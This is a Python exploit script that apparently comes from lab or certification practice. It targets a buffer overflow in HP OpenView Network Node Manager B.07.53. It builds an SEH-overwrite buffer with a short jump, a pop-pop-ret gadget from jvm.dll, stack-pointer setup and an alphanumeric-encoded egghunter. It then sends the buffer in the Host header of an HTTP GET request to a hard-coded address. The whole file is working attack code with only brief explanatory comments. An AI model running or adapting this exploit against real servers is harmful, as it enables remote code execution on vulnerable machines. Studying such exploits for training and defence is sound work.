#!/usr/bin/env python3

# author: greyshell
# description: encoded egghunter payload using alphaNumEncoder

import socket

# global constant variable
HOST = "172.16.116.198"
PORT = "7510"


def main():
    # max crash buff length = 3780
    total_len_buff = 3780

    initial_buff = "A" * 3305

    # 1035FE34   48               DEC EAX
    # 1035FE35   48               DEC EAX
    # 1035FE36   77 04            JA SHORT 1035FE59
    # little endian format: "\x4c\x4c\x77\x04"  ==> bad char friendly
    nseh = "\x48\x48\x77\x04"

    # 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR:
    # False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP
    # OpenView\jre\jreActive\bin\client\jvm.dll)
    seh = (0x6d6e394a.to_bytes(4, 'little')).decode('ISO-8859-1')

    # setting up ESP dynamically to bypassing ASLR protection
    # 2216FDF0   58               POP EAX
    # 2216FDF8   66:05 2C01       ADD AX,12C
    # 2216FDF6   50               PUSH EAX
    # 2216FDF7   5C               POP ESP

    esp_setup = "\x58\x66\x05\x2c\x01\x50\x5c"

    # !mona encode ascii -t alphanum -b '\x00\x0a\x0d\x2f\x3a\x3f\x40\x80..\xff' -s
    # 6681CAFF0F42526A0258CD2E3C055A74EFB8543030578BFAAF75EAAF75E7FFE7
    encoded_egghunter = (
        "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x5d\x55\x5d\x2d\x2d\x5d\x55\x5d\x2d\x31\x5e\x55\x5d\x50\x25"
        "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x2c\x5c\x6f\x2d\x70\x2c\x5c\x6f\x2d\x71\x31\x5d\x71\x50\x25\x4a"
        "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x38\x26\x57\x2d\x45\x38\x26\x57\x2d\x46\x38\x28\x57\x50\x25\x4a\x4d"
        "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5b\x6c\x37\x45\x2d\x5b\x6c\x37\x45\x2d\x5b\x6e\x3c\x45\x50\x25\x4a\x4d\x4e"
        "\x55\x25\x35\x32\x31\x2a\x2d\x41\x53\x37\x2d\x2d\x41\x53\x37\x2d\x2d\x42\x54\x37\x31\x50\x25\x4a\x4d\x4e\x55"
        "\x25\x35\x32\x31\x2a\x2d\x54\x37\x66\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46\x50\x25\x4a\x4d\x4e\x55\x25"
        "\x35\x32\x31\x2a\x2d\x50\x3e\x39\x31\x2d\x50\x3e\x39\x31\x2d\x51\x41\x3b\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35"
        "\x32\x31\x2a\x2d\x33\x2a\x67\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50")

    # replaced the "D" buffer with "A" buffer to protect from ESP corruption because D will be interpreted as INC ESP
    buff_last = "A" * (
                total_len_buff - len(initial_buff) - len(nseh) - len(seh) - len(esp_setup) - len(encoded_egghunter))

    crash = initial_buff + nseh + seh + esp_setup + encoded_egghunter + buff_last

    # preparing the GET request
    buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
    buffer += "Host: " + crash + "\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
    buffer += "Content-Length: 1048580\r\n\r\n"

    print(f"[+] sending evil GET HTTP request to HP NNM -B.07.53, hosted on {HOST}:{PORT}")
    print(f"[+] buffer length: {len(crash)}")
    exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exploit.connect((HOST, int(PORT)))
    exploit.send(buffer.encode())
    exploit.close()


if __name__ == "__main__":
    main()
